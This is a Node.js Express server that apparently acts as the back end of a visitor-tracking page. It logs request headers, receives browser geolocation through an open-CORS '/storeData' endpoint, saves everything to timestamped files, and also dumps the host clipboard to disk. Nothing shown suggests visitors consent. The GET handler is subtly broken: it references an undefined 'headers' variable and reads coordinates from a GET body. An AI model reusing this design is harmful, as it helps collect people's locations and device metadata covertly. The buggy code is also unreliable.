import express from 'express';
import bodyParser from 'body-parser';
import fs from 'fs';
import cors from 'cors';
import clipboardy from 'clipboardy';
import { fileURLToPath } from 'url';
import { dirname } from 'path';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const app = express();
const PORT = 3000;

// Middleware
app.use(bodyParser.json());
app.use(express.static('public'));
app.use(cors());

// Enable CORS
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
    next();
});

app.get('/', async function (req, res) {
    const currentDate = new Date().toISOString().split('T')[0];
    const currentTime = new Date().toISOString().split('T')[1].substring(0, 5); // Extracting hours and minutes
    const currentDateTime = `${currentDate}-${currentTime}`;
    const { latitude, longitude } = req.body;



    try {
        // Save headers data to a file
        fs.writeFile(`${__dirname}/data/headers${currentDateTime}.json`, JSON.stringify({ headers, currentDateTime }), (err) => {
            if (err) throw err;
            console.log('Headers data saved successfully.');
        });
        // Obtain the content of the clipboard asynchronously
        const clipboardContent = await clipboardy.read();
        console.log('Contenido del portapapeles:', clipboardContent);

        // Save clipboard content to a file
        fs.writeFile(`${__dirname}/data/clipboard${currentDateTime}.json`, clipboardContent, (err) => {
            if (err) throw err;
            console.log('Clipboard data saved successfully.');
        });

        res.sendFile(`${__dirname}/index.html`);
    } catch (error) {
        console.error('Error occurred while reading clipboard:', error);
        res.status(500).send('Internal Server Error');
    }
});

app.post('/storeData', (req, res) => {
    const { latitude, longitude } = req.body;
    const headers = req.headers;
    const currentDate = new Date().toISOString().split('T')[0];
    const currentTime = new Date().toISOString().split('T')[1].substring(0, 5); // Extracting hours and minutes
    const currentDateTime = `${currentDate}-${currentTime}`;

    // Save headers data to a file
    fs.writeFile(`${__dirname}/data/headers${currentDateTime}.json`, JSON.stringify({ headers, currentDateTime }), (err) => {
        if (err) throw err;
        console.log('Headers data saved successfully.');
    });

    // Save location data to a file
    const locationData = { latitude, longitude, currentDateTime };
    fs.writeFile(`${__dirname}/data/location${currentDateTime}.json`, JSON.stringify(locationData), (err) => {
        if (err) throw err;
        console.log('Location data saved successfully.');
    });

    console.log('Received location:', latitude);
    console.log('Received longitude:', longitude);
    res.send('ok');
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
